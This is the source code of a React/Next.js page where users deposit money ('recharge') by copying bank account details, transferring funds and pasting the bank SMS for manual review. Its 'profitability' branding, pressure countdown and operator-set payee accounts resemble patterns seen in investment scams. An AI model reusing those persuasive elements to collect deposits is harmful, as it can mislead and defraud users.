"use client";

import { useState, useEffect, Suspense } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { db, auth } from "@/lib/firebase";
import { doc, getDoc, addDoc, collection } from "firebase/firestore";
import { ChevronLeft, Copy, Loader2, ArrowRight, Zap } from "lucide-react";
import { toast } from "sonner";

function ExpressContent() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const amount = searchParams.get("amount") || "0";
    const methodId = searchParams.get("methodId");

    const [loading, setLoading] = useState(true);
    const [method, setMethod] = useState<any>(null);
    const [timeLeft, setTimeLeft] = useState(600);
    const [smsContent, setSmsContent] = useState("");
    const [copiedAccount, setCopiedAccount] = useState(false);
    const [copiedName, setCopiedName] = useState(false);

    useEffect(() => {
        const fetchMethod = async () => {
            if (!methodId) return;
            try {
                const docRef = doc(db, "paymentMethods", methodId);
                const docSnap = await getDoc(docRef);
                if (docSnap.exists()) setMethod(docSnap.data());
            } catch (error) { toast.error("Failed to load"); }
            finally { setLoading(false); }
        };
        fetchMethod();
    }, [methodId]);

    useEffect(() => {
        if (timeLeft <= 0) return;
        const intervalId = setInterval(() => setTimeLeft((prev) => prev - 1), 1000);
        return () => clearInterval(intervalId);
    }, [timeLeft]);

    const { m, s } = { m: Math.floor(timeLeft / 60), s: timeLeft % 60 };

    const handleCopy = (text: string, type: 'account' | 'name') => {
        navigator.clipboard.writeText(text);
        toast.success("Copied");

        if (type === 'account') {
            setCopiedAccount(true);
            setTimeout(() => setCopiedAccount(false), 2000);
        } else {
            setCopiedName(true);
            setTimeout(() => setCopiedName(false), 2000);
        }
    };

    const handleSubmit = async () => {
        if (!smsContent.trim()) {
            toast.error("Please enter SMS content or FT code");
            return;
        }

        try {
            const user = auth.currentUser;
            if (!user) {
                toast.error("Please login first");
                return;
            }

            // Fetch phone number from users collection
            const userDocRef = doc(db, "users", user.uid);
            const userDocSnap = await getDoc(userDocRef);
            const userPhone = userDocSnap.exists() ? userDocSnap.data()?.phoneNumber : "";

            // Save to RechargeReview collection
            await addDoc(collection(db, "RechargeReview"), {
                paymentMethod: "express",
                bankName: method?.bankName || "",
                phoneNumber: userPhone || user.phoneNumber || "",
                amount: Number(amount),
                FTcode: smsContent,
                accountHolderName: method?.holderName || "",
                accountNumber: method?.accountNumber || "",
                status: "Under Review",
                userId: user.uid,
                timestamp: new Date()
            });

            toast.success("Submitted successfully! Under review.");
            router.push("/users/transaction-pending?theme=express");
        } catch (error) {
            console.error("Submission error:", error);
            toast.error("Failed to submit. Please try again.");
        }
    };

    if (loading) return <div className="min-h-screen flex items-center justify-center"><Loader2 className="animate-spin text-black" /></div>;

    return (
        <div className="min-h-screen bg-white text-black font-sans pb-24">
            {/* Minimal Header */}
            <header className="px-4 sm:px-6 py-5 flex items-center justify-between sticky top-0 bg-white/90 backdrop-blur-md z-10 border-b border-slate-100">
                <button onClick={() => router.back()} className="w-11 h-11 bg-slate-100 rounded-full flex items-center justify-center hover:bg-slate-200 active:scale-95 transition-all">
                    <ChevronLeft size={22} />
                </button>
                <div className="flex flex-col items-center">
                    <span className="text-[10px] font-black uppercase tracking-[0.15em] text-slate-400">Express Pay</span>
                    <span className="font-mono font-bold tabular-nums text-xl text-emerald-600 mt-0.5">
                        {String(m).padStart(2, '0')}:{String(s).padStart(2, '0')}
                    </span>
                </div>
                <div className="w-11"></div>
            </header>

            <main className="px-4 sm:px-6 pt-6 max-w-md mx-auto space-y-6">
                {/* Big Amount - High Visibility */}
                <div className="bg-black text-white p-8 rounded-3xl shadow-2xl flex flex-col items-center justify-center gap-2">
                    <span className="text-slate-400 text-xs uppercase tracking-wider">Total Payment</span>
                    <span className="text-5xl font-bold tracking-tight">ETB {Number(amount).toLocaleString()}</span>
                </div>

                <div className="space-y-5">
                    <div className="flex items-center gap-3">
                        <div className="w-9 h-9 bg-emerald-100 rounded-full flex items-center justify-center text-emerald-600 font-bold text-sm flex-shrink-0">1</div>
                        <h2 className="font-bold text-base sm:text-lg leading-tight">Step 1 <span className="font-normal text-slate-500 text-sm sm:text-base">Copy account for payment</span></h2>
                    </div>

                    <div className="bg-slate-50 border-l-4 border-black p-5 space-y-5 rounded-r-2xl shadow-sm">
                        <div className="flex justify-between items-center pb-4 border-b border-slate-200">
                            <span className="text-slate-500 text-sm font-medium">Bank</span>
                            <span className="font-bold text-slate-900">{method?.bankName}</span>
                        </div>

                        <div className="space-y-3">
                            <label className="text-xs text-slate-500 font-semibold uppercase tracking-wide">Account Number</label>
                            <div className="flex justify-between items-center bg-white p-4 rounded-xl border border-slate-200 gap-3">
                                <span className="font-mono text-lg sm:text-xl font-bold tracking-wide text-slate-900">{method?.accountNumber}</span>
                                <button
                                    onClick={() => handleCopy(method?.accountNumber, 'account')}
                                    className={`px-4 py-1.5 rounded-full text-xs font-bold uppercase tracking-wider transition-all flex-shrink-0 ${copiedAccount
                                        ? 'bg-emerald-100 text-emerald-600'
                                        : 'bg-purple-100 text-purple-600 hover:bg-purple-200'
                                        }`}
                                >
                                    {copiedAccount ? 'Copied!' : 'copy'}
                                </button>
                            </div>
                        </div>

                        <div className="space-y-3">
                            <label className="text-xs text-slate-500 font-semibold uppercase tracking-wide">Account Name</label>
                            <div className="flex justify-between items-center bg-white p-4 rounded-xl border border-slate-200 gap-3">
                                <span className="font-semibold text-slate-900 flex-1">{method?.holderName}</span>
                                <button
                                    onClick={() => handleCopy(method?.holderName, 'name')}
                                    className={`px-4 py-1.5 rounded-full text-xs font-bold uppercase tracking-wider transition-all flex-shrink-0 ${copiedName
                                        ? 'bg-emerald-100 text-emerald-600'
                                        : 'bg-purple-100 text-purple-600 hover:bg-purple-200'
                                        }`}
                                >
                                    {copiedName ? 'Copied!' : 'copy'}
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Confirmation */}
                <div className="space-y-4">
                    <div className="flex items-center gap-3">
                        <div className="w-9 h-9 bg-slate-100 rounded-full flex items-center justify-center text-slate-600 font-bold text-sm flex-shrink-0">2</div>
                        <h2 className="font-bold text-base sm:text-lg leading-tight">
                            <span className="text-red-500">Paste payment SMS</span> <span className="text-slate-500 font-normal text-sm">or enter TID: FT*****</span>
                        </h2>
                    </div>

                    <div className="relative">
                        <textarea
                            value={smsContent}
                            onChange={(e) => setSmsContent(e.target.value)}
                            placeholder="Dear Mr your Account 1*********1122 has been debited wth ETB 200.00. Your Current Balance is ETB 44.76 Thank you for Banking with CBE! etc..."
                            className="w-full h-36 bg-slate-50 border-2 border-slate-200 focus:border-emerald-500 focus:bg-white rounded-2xl p-4 resize-none transition-all outline-none font-medium text-slate-700 placeholder:text-slate-400 text-sm leading-relaxed shadow-sm"
                        />
                    </div>
                </div>
            </main>

            {/* Action Button */}
            <div className="fixed bottom-0 left-0 right-0 p-6 bg-white border-t border-slate-100 z-50">
                <div className="max-w-lg mx-auto">
                    <button
                        onClick={handleSubmit}
                        disabled={!smsContent.trim()}
                        className={`w-full h-14 rounded-full font-bold uppercase tracking-wider transition-all flex items-center justify-center gap-2 ${!smsContent.trim()
                            ? 'bg-slate-300 text-slate-500 cursor-not-allowed opacity-70'
                            : 'bg-emerald-600 text-white hover:bg-emerald-700 active:scale-[0.98] shadow-lg shadow-emerald-200'
                            }`}
                    >
                        <span>I Have Transferred</span>
                        <ArrowRight size={18} />
                    </button>
                </div>
            </div>

            <WelcomeNotification method={method} />
        </div>
    );
}

function WelcomeNotification({ method }: { method: any }) {
    const [show, setShow] = useState(true);
    const [animateOut, setAnimateOut] = useState(false);

    const handleDismiss = () => {
        setAnimateOut(true);
        setTimeout(() => setShow(false), 300);
    };

    if (!show) return null;

    return (
        <div className={`fixed inset-0 z-[60] flex items-center justify-center p-6 bg-black/60 backdrop-blur-sm transition-opacity duration-300 ${animateOut ? 'opacity-0' : 'opacity-100'}`}>
            <div className={`bg-white rounded-[2.5rem] p-8 max-w-sm w-full shadow-2xl space-y-8 text-center transform transition-all duration-300 ${animateOut ? 'scale-95 translate-y-4' : 'scale-100 translate-y-0'} animate-in slide-in-from-bottom-8 relative overflow-hidden`}>
                <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-emerald-400 to-green-500"></div>

                <div className="w-24 h-24 bg-emerald-50 rounded-full flex items-center justify-center mx-auto text-emerald-600 mb-2 ring-8 ring-emerald-50/50">
                    <Zap size={40} className="fill-current animate-pulse" />
                </div>

                <div className="space-y-4">
                    <h3 className="text-3xl font-black text-slate-900 uppercase italic tracking-tighter">Express Entry</h3>
                    <p className="text-slate-600 text-sm font-medium leading-relaxed">
                        Welcome to <span className="font-bold text-emerald-600">Turner Profitable Construction Partner</span>.
                        <br /><br />
                        <span className="font-bold text-emerald-600 uppercase">{method?.bankDetailType || "Express"} Payment</span> gateway selected.
                        <br />
                        Your fast-track to profitability is ready.
                        <br /><br />
                        Thank you for selecting the <span className="font-bold text-emerald-600">Express Payment Method</span>.
                    </p>
                </div>

                <button
                    onClick={handleDismiss}
                    className="w-full bg-slate-900 hover:bg-black text-white font-black h-16 rounded-2xl transition-all active:scale-95 shadow-xl shadow-slate-300 flex items-center justify-center gap-3 group relative overflow-hidden"
                >
                    <div className="absolute inset-0 bg-gradient-to-r from-emerald-500 to-green-600 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <span className="relative z-10 text-lg tracking-widest uppercase">ENTER NOW</span>
                    <ArrowRight size={24} className="relative z-10 group-hover:translate-x-1 transition-transform" />
                </button>
            </div>
        </div>
    );
}

export default function ExpressBankDetailPage() {
    return (
        <Suspense fallback={<div className="min-h-screen flex items-center justify-center bg-white"><Loader2 className="animate-spin text-emerald-500" /></div>}>
            <ExpressContent />
        </Suspense>
    );
}
